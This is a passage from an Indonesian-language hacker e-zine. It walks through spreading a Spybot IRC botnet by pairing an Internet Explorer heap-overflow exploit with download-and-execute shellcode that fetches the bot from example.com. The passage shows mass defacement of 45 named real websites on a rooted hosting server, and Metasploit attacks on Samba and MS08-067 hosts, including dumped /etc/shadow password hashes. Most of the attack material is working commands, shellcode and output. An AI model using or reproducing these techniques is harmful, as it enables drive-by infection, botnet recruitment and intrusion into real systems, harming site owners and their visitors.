+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:31038          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:65535          0.0.0.0:0              LISTENING
+  TCP    127.0.0.1:1026         0.0.0.0:0              LISTENING
+  TCP    127.0.0.1:5354         0.0.0.0:0              LISTENING
+  TCP    127.0.0.89:1271        127.0.0.89:80          SYN_SENT
+  TCP    127.0.0.133:1272       127.0.0.133:80         SYN_SENT
+  UDP    0.0.0.0:445            *:*
+  UDP    0.0.0.0:500            *:*
+  UDP    0.0.0.0:1025           *:*
+  UDP    0.0.0.0:4500           *:*
+  UDP    0.0.0.0:30167          *:*
+  UDP    127.0.0.1:123          *:*
+  UDP    127.0.0.1:1040         *:*
+  UDP    127.0.0.1:1041         *:*
+  UDP    127.0.0.1:1269         *:*
+  UDP    127.0.0.1:1900         *:*
+  UDP    127.0.0.1:5353         *:*
+
+D:\>
+
+Lihat hasil netstat di atas pada baris yang tertulis
+
+TCP    0.0.0.0:65535          0.0.0.0:0              LISTENING
+
+Port 65535 terbuka karena korban mengklik halaman website yang dibuat
+attacker menggunakan IE yang vulnerable. Dalam percobaan ini saya
+menggunakan IE dari Windows XP SP2. Attacker selanjutnya tinggal
+memanfaatkan netcat atau telnet untuk melakukan koneksi ke port 65535
+komputer korban. Akan lebih baik jika halaman website tersebut 
+menggunakan shellc0de reverse tcp. Lalu apa hubungannya IE 0day ini
+dengan penyebaran botnet?? Sekarang bayangkan jika saya menggunakan
+shellc0de download-exec kemudian saya melakukan mass defacing atau 
+mass dns redirection ke halaman website yang sudah saya buat. Tentu saja
+semua pengguna IE vulnerable akan mendowload dan mengeksekusi sembarang
+file yang saya inginkan. Jika file yang saya inginkan itu adalah file
+bot? Ribuan pengguna IE dipastikan terancam menjadi zombie botnet
+bukan?! Let see th1z in da next chapter guys!
+
+[0x04]-[3] IE 0day For Spreading da Botnet 
+
+Seperti sudah saya sebutkan sebelumnya, IE dengan celah XML parsing heap
+overflownya jika diexploitasi menggunakan shellc0de  download-exec, akan
+sangat berguna untuk penyebaran botnet. Artikel, buku, atau literatur
+lain yang membahas mengenai botnet sangatlah banyak tetapi yang 
+menjelaskan bagaimana menyebarkan botnet dengan detail sangatlah sedikit.
+Tantangan terbesar pada setting up botnet adalah penyebaran dan
+pengumpulan zombie. Untuk selanjutnya saya menggunakan spybot versi 1.3
+dalam menjelaskan artikel ini. Kebanyakan bot yang sudah digunakan
+secara luas bisa dideteksi oleh anti virus termasuk spybot versi 1.3 
+ini. 
+
+Sebelum melakukan kompilasi spybot, ada beberapa hal yang harus
+dikonfigurasi terlebih dahulu. Konfigurasi spybot ada di file settings.h
+meliputi IRC server, IRC channel, dan password.
+
+char password[] = "mybot"; //bots password 
+char channel[] = "#myzombie"; //channel bot joins on connect 
+char channelpass[] = "zomchan"; //password of the channel
+
+//servers
+
+char *ircservers[]={
+        "irc.dal.net",
+        NULL //dont remove this line
+};
+
+Lakukan kompilasi menggunakan kompiler yang disarankan yaitu lcc. LCC
+bisa didownload di http://www.cs.virginia.edu/~lcc-win32/. Setelah
+selesai kompilasi akan dihasilkan dua buah file baru yaitu spybot.obj
+dan spybot.exe. Upload file spybot.exe misal di http://example.com/s.exe
+lalu buatlah exploit IE untuk mendownload dan mengexksekusi file di
+http://example.com/s.exe ini.
+
+staff@eleet:~/Hack/meta$ ./msfpayload windows/download_exec \
+> URL=http://example.com/s.exe J
+// windows/download_exec - 364 bytes
+// http://www.metasploit.com
+// URL=http://example.com/s.exe
+%u10eb%u4a5a%uc933%ub966%u013c%u3480%u990a%ufae2%u05eb%uebe8%uffff%u70ff%u994c%u9999%ufdc3%ua938%u9999%u1299%u95d9%ue912%u3485%ud912%u1291%u1241%ua5ea%ued12%ue187%u6a9a%ue712%u9ab9%u1262%u8dd7%u74aa%ucecf%u12c8%u9aa6%u1262%uf36b%uc097%u3f6a%u91ed%uc6c0%u5e1a%udc9d%u707b%uc6c0%u12c7%u1254%ubddf%u5a9a%u7848%u589a%u50aa%u12ff%u1291%u85df%u5a9a%u7858%u9a9b%u1258%u9a99%u125a%u1263%u1a6e%u975f%u4912%u9df3%u71c0%u99c9%u9999%u5f1a%ucb94%u66cf%u65ce%u12c3%uf341%uc098%ua471%u9999%u1a99%u8a5f%udfcf%ua719%uec19%u1963%u19af%u1ac7%ub975%u4512%ub9f3%u66ca%u75ce%u9d5e%uc59a%ub7f8%u5efc%u9add%ue19d%u99fc%uaa99%uc959%ucac9%uc9cf%uce66%u1265%uc945%u66ca%u69ce%u66c9%u6dce%u59aa%u1c35%uec59%uc860%ucfcb%u66ca%uc34b%u32c0%u777b%u59aa%u715a%u66bf%u6666%ufcde%uc9ed%uf6eb%ud8fa%ufdfd%ufceb%ueaea%ude99%uedfc%ue0ca%uedea%uf4fc%uf0dd%ufceb%uedfa%uebf6%ud8e0%uce99%uf7f0%ue1dc%ufafc%udc99%uf0e1%ucded%uebf1%uf8fc%u99fd%uf6d5%ufdf8%uf0d5%uebfb%uebf8%ud8e0%uec99%uf5eb%uf6f4%u99f7%ucbcc%uddd5%ueef6%uf5f7%uf8f6%ucdfd%udff6%uf5f0%ud8fc%u6899%u7474%u3a70%u2f2f%u7865%u6d61%u6c70%u2e65%u6f63%u2f6d%u2e73%u7865%u8065
+staff@eleet:~/Hack/meta$ diff -u 0day-ie-krafty.txt \
+> 0day-ie-krafty-dl-ex.txt 
+--- 0day-ie-krafty.txt	2008-12-28 20:25:56.000000000 -0800
++++ 0day-ie-krafty-dl-ex.txt	2008-12-28 20:28:40.000000000 -0800
+@@ -18,11 +18,10 @@
+ <html>
+ <div id="replace">x</div>
+ <script>
+-// windows/exec - 148 bytes
++// windows/download_exec - 364 bytes
+ // http://www.metasploit.com
+-// Encoder: x86/shikata_ga_nai
+-// EXITFUNC=process, CMD=calc.exe
+-var shellcode =
+unescape("%uc92b%u1fb1%u0cbd%uc536%udb9b%ud9c5%u2474%u5af4%uea83%u31fc%u0b6a%u6a03%ud407%u6730%u5cff%u98bb%ud7ff%ua4fe%u9b74%uad05%u8b8b%u028d%ud893%ubccd%u35a2%u37b8%u4290%ua63a%u94e9%u9aa4%ud58d%ue5a3%u1f4c%ueb46%u4b8c%ud0ad%ua844%u524a%u3b81%ub80d%ud748%u4bd4%u6c46%u1392%u734a%u204f%uf86e%udc8e%ua207%u26b4%u04d4%ud084%uecba%u9782%u217c%ue8c0%uca8c%uf4a6%u4721%u0d2e%ua0b0%ucd2c%u00a8%ub05b%u43f4%u24e8%u7a9c%ubb85%u7dcb%ua07d%ued92%u09e1%u9631%u5580");
++// URL=http://example.com/s.exe
++var shellcode =
+unescape("%u10eb%u4a5a%uc933%ub966%u013c%u3480%u990a%ufae2%u05eb%uebe8%uffff%u70ff%u994c%u9999%ufdc3%ua938%u9999%u1299%u95d9%ue912%u3485%ud912%u1291%u1241%ua5ea%ued12%ue187%u6a9a%ue712%u9ab9%u1262%u8dd7%u74aa%ucecf%u12c8%u9aa6%u1262%uf36b%uc097%u3f6a%u91ed%uc6c0%u5e1a%udc9d%u707b%uc6c0%u12c7%u1254%ubddf%u5a9a%u7848%u589a%u50aa%u12ff%u1291%u85df%u5a9a%u7858%u9a9b%u1258%u9a99%u125a%u1263%u1a6e%u975f%u4912%u9df3%u71c0%u99c9%u9999%u5f1a%ucb94%u66cf%u65ce%u12c3%uf341%uc098%ua471%u9999%u1a99%u8a5f%udfcf%ua719%uec19%u1963%u19af%u1ac7%ub975%u4512%ub9f3%u66ca%u75ce%u9d5e%uc59a%ub7f8%u5efc%u9add%ue19d%u99fc%uaa99%uc959%ucac9%uc9cf%uce66%u1265%uc945%u66ca%u69ce%u66c9%u6dce%u59aa%u1c35%uec59%uc860%ucfcb%u66ca%uc34b%u32c0%u777b%u59aa%u715a%u66bf%u6666%ufcde%uc9ed%uf6eb%ud8fa%ufdfd%ufceb%ueaea%ude99%uedfc%ue0ca%uedea%uf4fc%uf0dd%ufceb%uedfa%uebf6%ud8e0%uce99%uf7f0%ue1dc%ufafc%udc99%uf0e1%ucded%uebf1%uf8fc%u99fd%uf6d5%ufdf8%uf0d5%uebfb%uebf8%ud8e0%uec99%uf5eb%uf6f4%u99f7%ucbcc%uddd5%ueef6%uf5f7%uf8f6%ucdfd%udff6%uf5f0%ud8fc%u6899%u7474%u3a70%u2f2f%u7865%u6d61%u6c70%u2e65%u6f63%u2f6d%u2e73%u7865%u8065");
+ 
+ // ugly heap spray, the d0nkey way!
+ // works most of the time
+@@ -45,4 +44,4 @@
+ </script>
+ </html>
+ 
+-# milw0rm.com [2008-12-15]
+\ No newline at end of file
++# milw0rm.com [2008-12-15]
+staff@eleet:~/Hack/meta$
+
+Sebuah catatan mengenai exploit di atas, saat penulis melakukan
+pengujian dengan shellcode download exec, exploit masih bersifat 
+tidak stabil dengan hasil kadang sukses kadang juga gagal. Silakan
+yang kungfu javascriptnya keren dimainkan sendiri. Goal dari tulisan
+ini adalah konsep penyebaran botnet menggunakan IE XML parsing heap
+overflow vulnerability.
+
+Setelah semua disiapkan, buatlah sebuah channel di salah satu server 
+IRC publik atau gunakan server IRC sendiri. Pada file settings.h spybot
+di atas, saya menggunakan server irc.dal.net dengan channel #myzombie.
+Langkah terakhir setalah semua disiapkan adalah memikirkan bagaimana
+caranya supaya file HTML yang digunakan untuk mengexploitasi celah IE di
+klik oleh banyak orang. Ide yang sempat terpikirkan pada saat membuat
+artikel ini adalah dengan melakukan mass defacing dan mass dns
+redirection. Untuk melanjutkan dongeng pada artikel ini, penulis
+menggunakan mass defacing website pada server sebuah hosting (defacing 
+is so last year men?! surely not!)
+
+staff@eleet$ ssh -l root  64.148.xx.yy
+root@64.148.xx.yy's password: 
+Last login: Sun Dec 28 23:02:58 2008 from router1.verisign.com
+[root@plws1 ~]# less /etc/passwd
+
+(..edited..)
+com_tincan:x:10334:10001::/home/vhosts/tincan.com:/bin/bash
+xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
+member:x:10352:10352::/home/member:/bin/bash
+com_dseance:x:10221:10001::/home/vhosts/digitalseance.com:/bin/false
+com_halftide:x:10225:10001::/home/vhosts/half-tide.com:/bin/false
+com_ikitchens:x:10236:10001::/home/vhosts/impulsekitchens.com:/bin/false
+com_peteraah:x:10273:10001::/home/vhosts/peteralistairhenderson.com:/bin/false
+com_squidcannon:x:10289:10001::/home/vhosts/squidcannon.com:/bin/false
+net_kcdj:x:10308:10001::/home/vhosts/kcdj.net:/bin/false
+com_urbanhd:x:10107:10001::/home/vhosts/urbanharvestdesign.com:/bin/false
+truongth:x:10067:10001::/home/vhosts/truongtronghung.com:/bin/false
+com_cmsfacts:x:10044:10001::/home/vhosts/cmsfacts.com:/bin/false
+(..edited..)
+
+
+[root@plws1 ~]# cat /etc/passwd|grep "/home/vhosts"|wc -l
+38
+[root@plws1 ~]# #hanya 38 vhost - coba check di /home/vhosts
+[root@plws1 ~]# cd /home/vhosts
+[root@plws1 vhosts]# ls | wc -l
+206
+[root@plws1 vhosts]# #Jadi ada 206 vhost - letz check?!
+
+Setelah melakukan oprekan pada sang server selama beberapa menit
+akhirnya diketahui bahwa masing-masing virtual host konfigurasinya ada
+di file /home/vhosts/<nama_vhost.com?net?>/conf/httpd.include.
+Selanjutnya, saya sebagai sang attacker membaca salah satu konfigurasi
+file httpd.include dan berkesimpulan bahwa DocumentRoot default
+masing-masing vhost ada di  /home/vhosts/<nama_vhost.com?net?>/httpdocs/
+
+[root@plws1 vhosts]#  LS=$(ls); for VHOST in $LS;do \
+> if [ -d $VHOST/httpdocs ]; then echo $VHOST : exist|tee -a \
+> /tmp/vhosts.txt;fi;done
+amiexisme.net : exist
+andinasoft.com : exist
+artandgems.com : exist
+atomicsightandsound.com : exist
+bukan.band1t.net : exist
+caitlinkuhwald.com : exist
+caskating.com : exist
+caskating.com.org : exist
+chadmin.net : exist
+chezbrett.com : exist
+cmsfacts.com : exist
+compusettle.com : exist
+consult-tti.com : exist
+digitalseance.com : exist
+disdcompsci.com : exist
+friedrichrealestate.com : exist
+gourmetkitchenfundraising.com : exist
+h2oh-hosting.com : exist
+hafercase.com.bak : exist
+half-tide.com : exist
+impulsekitchens.com : exist
+jerz.setonhill.edu : exist
+joakim-yvette.com : exist
+jonsoft.com : exist
+kcdj.net : exist
+lauriereid.com : exist
+maybunda.com : exist
+militariaresearch.com : exist
+mymediadesk.com : exist
+nthgravity.com : exist
+peteralistairhenderson.com : exist
+petstarr.net : exist
+positive-messages.com : exist
+racrew.us : exist
+ramen-noodles.com : exist
+shirleyramadhany.com : exist
+snadam.com : exist
+squidcannon.com : exist
+supplehost.com : exist
+techstarhomes.com : exist
+tincan.com : exist
+truongtronghung.com : exist
+urbanharvestdesign.com : exist
+vervelink.com : exist
+worcestershirefarmersmarkets.net : exist
+[root@plws1 vhosts]# wc -l /tmp/vhosts.txt 
+45 /tmp/vhosts.txt
+[root@plws1 vhosts]# #Ho ho ternyata ada 45 vhost yang bisa di deface
+[root@plws1 vhosts]# logout
+
+Connection to 64.148.xx.yy closed.
+anto@eleet:~/Hack/meta$ scp 0day-ie-krafty-dl-ex.txt \
+> root@64.148.xx.yy:/tmp/index.html
+root@64.148.130.170's password: 
+0day-ie-krafty-dl-ex.txt 		100% 2230     2.2KB/s   00:00    
+anto@eleet:~/Hack/meta$ ssh -l root 64.148.xx.yy
+root@64.148.xx.yy's password: 
+Last login: Sun Dec 28 23:02:58 2008 from router1.verisign.com
+[root@plws1 ~]# ls -l /tmp/index.html 
+-rwx------  1 root root 2230 Dec 29 09:13 /tmp/index.html
+[root@plws1 ~]# chmod 755 /tmp/index.html 
+[root@plws1 ~]# cd /home/vhosts
+[root@plws1 vhosts]# LS=$(ls); for VHOST in $LS;do \
+> if [ -d $VHOST/httpdocs ]; then cp /tmp/index.html \
+> $VHOST/httpdocs/;fi;done
+[root@plws1 vhosts]#
+
+Sekarang attacker sudah melakukan mass deface sebanyak 45 website, btw
+jumlah yang sangat sedikit untuk ukuran mass deface. Pengalaman penulis
+saat melakukan penetrasi, penulis pernah melakukan take over name server
+menggunakan PowerDNS yang berisi > 100.000 record A (domain) pada
+database. Silakan bayangkan sendiri jika penulis melakukan mass dns
+redirection untuk masing-masing domain. Berapa kira-kira mesin XP dengan
+IE yang akan terinfeksi?? Seberapa cepat interpol mencari pelaku?? haha
+just forget it! Kami tidak akan melakukan kebodohan seperti itu. Dan
+yang lebih penting juga, kami tidak pernah mengeksekusi apapun yang
+tertulis disini! 
+
+
+
+######################################################################
+	-- [0x06] -- Kiddie Gamez With Metasploit 3.2
+######################################################################
+
+Kiddie gamez? sure, karena hanya membahas bagaimana menggunakan exploit
+yang sudah ada di metasploit. Saya pikir kiddie sangat tertarik dengan
+tulisan yang berisi cara menggunakan sebuah tool, apalagi cara melakukan
+"hacking" ke Windowz XP SP2. Kami menggunakan dua contoh vulnerability
+untuk menjelaskan penggunaan metasploit yaitu penjelasan bagaimana
+mengexploitasi bugz ms08_067 netapi windows dan lsa_io_trans_names heap
+overflow pada aplikasi samba di linux. Walaupun judulnya kiddie games,
+anda tetap dituntut sedikit pengetahuan mengenai RFC jadi bagi kiddie
+kiddie yang sudah ngiler mulailah gigit jari.
+
+Bugz lsa_io_trans_names pada samba disebabkan karena adanya heap
+overflow di servis LSA RPC yang memungkinkan bagi seorang remote
+attacker untuk mengeksekusi sembarang perintah di mesin vulnerable.
+Seorang attacker yang berhasil mengeksploitasi celah ini, sangat mungkin
+mengkompromise sistem secara penuh (gaining root priviledge). Untuk
+detail informasi celah keamanan ini silakan mengacu pada CVE-2007-2446.
+Bagi kiddie fucker exploit celah keamanan ini sudah ada di metasploit.
+Saya tidak menggunakan kemampuan "automatic exploitation" metasploit
+tetapi mengkombinasikan mass scanning nmap dan metasploit! Okay, here we
+go!!
+
+staff@eleet:~/Hack/metasploit$ nmap -sV -vv -P0 -p 135,139,445 -oN \
+> logscan.txt 172.16.11.0/24
+
+Edited...
+
+staff@eleet:~/Hack/metasploit$ tail -32 logscan.txt 
+Interesting ports on 172.16.11.216:
+PORT    STATE  SERVICE      VERSION
+135/tcp closed msrpc
+139/tcp closed netbios-ssn
+445/tcp closed microsoft-ds
+MAC Address: 00:13:D4:5E:C3:5B (Asustek Computer)
+
+Interesting ports on 172.16.11.234:
+PORT    STATE  SERVICE     VERSION
+135/tcp closed msrpc
+139/tcp open   netbios-ssn Samba smbd 3.X (workgroup: INFORMATIKA)
+445/tcp open   netbios-ssn Samba smbd 3.X (workgroup: INFORMATIKA)
+MAC Address: 00:50:BF:B4:E2:7C (Mototech)
+
+Host script results:
+|_ Discover OS Version over NetBIOS and SMB: Unix
+
+Interesting ports on 172.16.11.242:
+PORT    STATE SERVICE      VERSION
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
+MAC Address: 00:50:BF:B5:9B:E4 (Mototech)
+Service Info: OS: Windows
+
+Host script results:
+|  Discover OS Version over NetBIOS and SMB: OS version cannot be
+determined.
+|_ Never received a response to SMB Setup AndX Request
+
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at
+http://nmap.org/submit/ .
+# Nmap done at Sat Dec 20 20:16:20 2008 -- 256 IP addresses (34 hosts
+up) scanned in 88.906 seconds
+
+
+staff@eleet:~/Hack/metasploit$ ./msfconsole 
+
+                                  _             
+                                 | |      o     
+ _  _  _    _ _|_  __,   ,    _  | |  __    _|_ 
+/ |/ |/ |  |/  |  /  |  / \_|/ \_|/  /  \_|  |  
+  |  |  |_/|__/|_/\_/|_/ \/ |__/ |__/\__/ |_/|_/
+                           /|                   
+                           \|                   
+
+
+       =[ msf v3.2-release
++ -- --=[ 320 exploits - 217 payloads
++ -- --=[ 20 encoders - 6 nops
+       =[ 99 aux
+
+msf > use linux/samba/lsa_transnames_heap
+msf exploit(lsa_transnames_heap) > set PAYLOAD linux/x86/shell_bind_tcp
+PAYLOAD => linux/x86/shell_bind_tcp
+msf exploit(lsa_transnames_heap) > set RHOST 172.16.11.116
+RHOST => 172.16.11.116
+msf exploit(lsa_transnames_heap) > set PAYLOAD linux/x86/shell_bind_tcp
+PAYLOAD => linux/x86/shell_bind_tcp
+msf exploit(lsa_transnames_heap) > set RHOST 172.16.11.116
+RHOST => 172.16.11.116
+msf exploit(lsa_transnames_heap) > set LPORT 5555
+LPORT => 5555
+msf exploit(lsa_transnames_heap) > show options
+
+Module options:
+
+   Name     Current Setting  Required  Description               
+   ----     ---------------  --------  -----------               
+   RHOST    172.16.11.116    yes       The target address        
+   RPORT    445              yes       Set the SMB service port  
+   SMBPIPE  LSARPC           yes       The pipe name to use      
+
+
+Payload options (linux/x86/shell_bind_tcp):
+
+   Name   Current Setting  Required  Description         
+   ----   ---------------  --------  -----------         
+   LPORT  5555             yes       The local port      
+   RHOST  172.16.11.116    no        The target address  
+
+
+Exploit target:
+
+   Id  Name            
+   --  ----            
+   0   Linux vsyscall  
+
+
+msf exploit(lsa_transnames_heap) > 
+
+Dari options di atas diketahui bahwa target mesin beralamat IP
+172.16.11.116, vulnerability diexploitasi melalui port 445 dengan
+menggunakan shellcode tcp binding pada port 5555 mesin target. Hal yang
+biasanya menyebabkan kegagalan exploitasi dengan shellcode tcp binding
+adalah adanya firewall. Oleh karena itu perlu dilakukan probing ACK
+untuk mengetahui port 5555 dihalangi firewall atau tidak. (Apalagi
+probing ACK?? sudah saya bilang bagi kiddie siap-siap gigit jari, sebuah
+petunjuk silakan baca RFC 793 mengenai TCP). 
+
+"Ketika paket ACK dikirim ke sebuah port, jika port tersebut tidak 
+dihalangi firewall (port dalam kondisi open/close), maka akan dibalikkan 
+RST ke pengirim. Jika port terhalang firewall, maka tidak ada paket yang 
+dibalikkan. Hal ini berarti jika paket ACK sampai ke port tujuan baik
+dalam kondisi open/close, maka tujuan akan selalu memberikan RST ke 
+pengirim" 
+
+Port yang digunakan oleh shellcode TCP binding juga harus port yang
+dalam kondisi tertutup, artinya port itu belum digunakan oleh servis
+apapun. Untuk itu diperlukan SYN probing agar tahu port dalam kondisi
+terbuka atau tertutup.
+
+"Ketika paket SYN dikirim ke sebuah port, maka jika port terbuka akan
+dibalikkan paket SYN/ACK tetapi jika tertutup akan dibalikkan paket
+RST/ACK ke pengirim"
+
+Teori ini yang digunakan pada probing ACK nmap (-sA) dan probing SYN
+nmap (-sS). Untuk keperluan probing ACK dan SYN ditulisan ini saya 
+menggunakan hping sebagai utility yang cukup handy. Selebihnya silakan 
+diperdalam sendiri bagaimana cara kerja protokol komunikasi.
+
+staff@eleet:~/Hack/metasploit$ sudo hping -A 172.16.11.116 -c 2 -p 5555
+HPING 172.16.11.116 (wlan0 172.16.11.116): A set, 40 headers + 0 data
+bytes
+len=46 ip=172.16.11.116 ttl=64 DF id=0 sport=5555 flags=R seq=0 win=0
+rtt=11.2 ms
+len=46 ip=172.16.11.116 ttl=64 DF id=0 sport=5555 flags=R seq=1 win=0
+rtt=10.9 ms
+
+--- 172.16.11.116 hping statistic ---
+2 packets transmitted, 2 packets received, 0% packet loss
+round-trip min/avg/max = 10.9/11.1/11.2 ms
+staff@eleet:~/Hack/metasploit$ sudo hping 172.16.11.116 -p 5555 -S -c 3
+HPING 172.16.11.116 (wlan0 172.16.11.116): S set, 40 headers + 0 data
+bytes
+len=46 ip=172.16.11.116 ttl=64 DF id=0 sport=5555 flags=RA seq=1 win=0
+rtt=12.8 ms
+len=46 ip=172.16.11.116 ttl=64 DF id=0 sport=5555 flags=RA seq=2 win=0
+rtt=159.7 ms
+
+--- 172.16.11.116 hping statistic ---
+3 packets transmitted, 2 packets received, 34% packet loss
+round-trip min/avg/max = 12.8/86.3/159.7 ms
+
+Hasil hping menunjukkan bahwa port 5555 tidak tertutup oleh firewall
+yang ditunjukkan oleh probing ACK (-A) menerima paket reply RST (R).
+Port 5555 juga dalam kondisi tertutup yang ditunjukkan oleh probing SYN
+(-S) menerima paket RST/ACK (RA). Selanjutnya exploitasi dengan
+metasploit bisa dilanjutkan.
+
+msf exploit(lsa_transnames_heap) > exploit
+[*] Started bind handler
+[*] Trying to exploit Samba with address 0xffffe410...
+[*] Connecting to the SMB service...
+[*] Binding to
+12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:172.16.11.116[\lsarpc]
+...
+[*] Bound to
+12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:172.16.11.116[\lsarpc]
+...
+[*] Calling the vulnerable function...
+[-] Error: EOFError: end of file reached
+[*] Trying to exploit Samba with address 0xffffe411...
+[*] Connecting to the SMB service...
+[*] Binding to
+12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:172.16.11.116[\lsarpc]
+...
+[*] Bound to
+12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:172.16.11.116[\lsarpc]
+...
+[*] Calling the vulnerable function...
+[-] Error: EOFError: end of file reached
+[*] Trying to exploit Samba with address 0xffffe412...
+[*] Connecting to the SMB service...
+[*] Binding to
+12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:172.16.11.116[\lsarpc]
+...
+[*] Bound to
+12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:172.16.11.116[\lsarpc]
+...
+[*] Calling the vulnerable function...
+[+] Server did not respond, this is expected
+[*] Command shell session 8 opened (172.16.11.180:48307 ->
+172.16.11.116:4444)
+
+id
+uid=0(root) gid=0(root) egid=65534(nogroup) groups=65534(nogroup)
+cat /etc/shadow
+root:$1$0c9EWXsD$P7TY69urOrj01zLFhw3SS1:13779:0:99999:7:::
+daemon:*:13779:0:99999:7:::
+bin:*:13779:0:99999:7:::
+sys:*:13779:0:99999:7:::
+sync:*:13779:0:99999:7:::
+games:*:13779:0:99999:7:::
+man:*:13779:0:99999:7:::
+lp:*:13779:0:99999:7:::
+mail:*:13779:0:99999:7:::
+news:*:13779:0:99999:7:::
+uucp:*:13779:0:99999:7:::
+proxy:*:13779:0:99999:7:::
+www-data:*:13779:0:99999:7:::
+backup:*:13779:0:99999:7:::
+list:*:13779:0:99999:7:::
+irc:*:13779:0:99999:7:::
+gnats:*:13779:0:99999:7:::
+nobody:*:13779:0:99999:7:::
+dhcp:!:13779:0:99999:7:::
+syslog:!:13779:0:99999:7:::
+klog:!:13779:0:99999:7:::
+cupsys:!:13779:0:99999:7:::
+messagebus:!:13779:0:99999:7:::
+haldaemon:!:13779:0:99999:7:::
+hplip:!:13779:0:99999:7:::
+gdm:!:13779:0:99999:7:::
+nightlogin:$1$RGG/eytf$0tX.vipHmAl1pnlaOkJ4J.:13779:0:99999:7:::
+avahi:!:13779:0:99999:7:::
+sshd:!:13779:0:99999:7:::
+novice:$1$nLv4Q0aJ$rV4IkBgFH1NMo/HzHX35u/:13779:0:99999:7:::
+postgres:$1$yBdKATZW$r2XvP5ruZkhN.6po16k9/1:13779:0:99999:7:::
+quagga:!:13779:0:99999:7:::
+mysql:!:13779:0:99999:7:::
+bind:!:13779:0:99999:7:::
+praktikum:$1$hE1FxBO9$xCG0Kqp3BR9V8RyhlxjAF.:13859:0:99999:7:::
+uname -a
+Linux komputer17 2.6.15-27-686 #1 SMP PREEMPT Fri Dec 8 18:00:07 UTC
+2006 i686 GNU/Linux
+cat /etc/issue
+Ubuntu 6.06.1 LTS \n \l
+exit
+[*] Command shell session 8 closed.
+msf exploit(lsa_transnames_heap) >
+
+GAME OVER!! Your Ubuntu Linux is Totally Pwned!
+
+Microsoft menerima pukulan lagi dengan ditemukannya flaw pada servis SMB
+karena cacat pada netapi32.dll. Dengan mengirimkan request RPC yang
+dibuat secara khusus, seorang remote attacker mungkin mengeksekusi
+sembarang perintah pada mesin yang vulnerable. Seorang attacker yang
+berhasil mengexploitasi bugz ini sangat mungkin mengkompromise sistem
+secara penuh (administrator priviledge). Untuk lebih detail mengenai
+celah keamanan ini silakan mengacu ke dokumen microsoft MS08-067 atau
+CVE-2008-4250.
+
+msf > use windows/smb/ms08_067_netapi
+msf exploit(ms08_067_netapi) > set RHOST 172.16.11.177
+RHOST => 172.16.11.177
+msf exploit(ms08_067_netapi) > set PAYLOAD windows/shell_bind_tcp
+PAYLOAD => windows/shell_bind_tcp
+msf exploit(ms08_067_netapi) > set LPORT 4444
+LPORT => 4444
+msf exploit(ms08_067_netapi) > show options
+
+Module options:
+
+   Name     Current Setting  Required  Description                             
+   ----     ---------------  --------  -----------                             
+   RHOST    172.16.11.177    yes       The target address                      
+   RPORT    445              yes       Set the SMB service port                
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER,SRVSVC)  
+
+
+Payload options (windows/shell_bind_tcp):
+
+   Name      Current Setting  Required  Description                           
+   ----      ---------------  --------  -----------                           
+   EXITFUNC  thread           yes       Exit technique: seh, thread,process  
+   LPORT     4444             yes       The local port                        
+   RHOST     172.16.11.177    no        The target address                    
+
+
+Exploit target:
+
+   Id  Name                 
+   --  ----                 
+   0   Automatic Targeting  
+
+
+msf exploit(ms08_067_netapi) >
+
+Dari options di atas diketahui bahwa target mesin beralamat IP
+172.16.11.177, vulnerability diexploitasi melalui port 445 dengan
+menggunakan shellcode tcp binding pada port 4444 mesin target. Sebelum
+melakukan exploitasi, saya melakukan probing ACK terlebih dahulu pada
+port 4444 mesin target.
+
+staff@eleet:~/Hack/metasploit$ sudo hping -A 172.16.11.177 -c 2 -p 4444
+HPING 172.16.11.177 (wlan0 172.16.11.177): A set, 40 headers + 0 data
+bytes
+len=40 ip=172.16.11.177 ttl=128 id=29166 sport=4444 flags=R seq=0 win=0
+rtt=10.6 ms
+len=40 ip=172.16.11.177 ttl=128 id=29167 sport=4444 flags=R seq=1 win=0
+rtt=2.7 ms
+
+--- 172.16.11.177 hping statistic ---
+2 packets transmitted, 2 packets received, 0% packet loss
+round-trip min/avg/max = 2.7/6.7/10.6 ms 
+
+Saya cukup malas melakukan probing SYN dan langsung melanjutkan
+exploitasi menggunakan metasploit dan BOOM!
+
+msf exploit(ms08_067_netapi) > exploit
+[*] Started bind handler
+[*] Automatically detecting the target...
+[*] Fingerprint: Windows XP Service Pack 2 - lang:English
+[*] Selected Target: Windows XP SP2 English (NX)
+[*] Triggering the vulnerability...
+[*] Command shell session 5 opened (172.16.11.180:59585 ->
+172.16.11.177:4444)
+
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>>cd\
+cd\
+C:\>netsh
+netsh>firewall show portopening
+
+Port configuration for Domain profile:
+Port   Protocol  Mode     Name
+-------------------------------------------------------------------
+139    TCP       Enable   NetBIOS Session Service
+445    TCP       Enable   SMB over TCP
+137    UDP       Enable   NetBIOS Name Service
+138    UDP       Enable   NetBIOS Datagram Service
+
+Port configuration for Standard profile:
+Port   Protocol  Mode     Name
+-------------------------------------------------------------------
+139    TCP       Enable   NetBIOS Session Service
+445    TCP       Enable   SMB over TCP
+137    UDP       Enable   NetBIOS Name Service
+138    UDP       Enable   NetBIOS Datagram Service
+netsh>quit
+C:\>type boot.ini
+type boot.ini
+[boot loader]
+timeout=30
+default=multi(0)disk(0)rdisk(0)partition(3)\WINDOWS
+[operating systems]
+multi(0)disk(0)rdisk(0)partition(3)\WINDOWS="Microsoft Windows XP
+Professional" /noexecute=optin /fastdetect
+
+C:\>exit
+
+Once again, GAME OVER! Your Windows XP SP2 is Totally Pwned! 
+Any question??Yes, sir!! I can't exploit the target with paranoid
+inbound firewall restriction. Can you teach me how to gain access to
+that target?! 
+
+Metasploit juga menyediakan cukup banyak payload/shellcode yang bisa
+digunakan untuk melakukan exploitasi. Untuk membaypass restriksi inbound
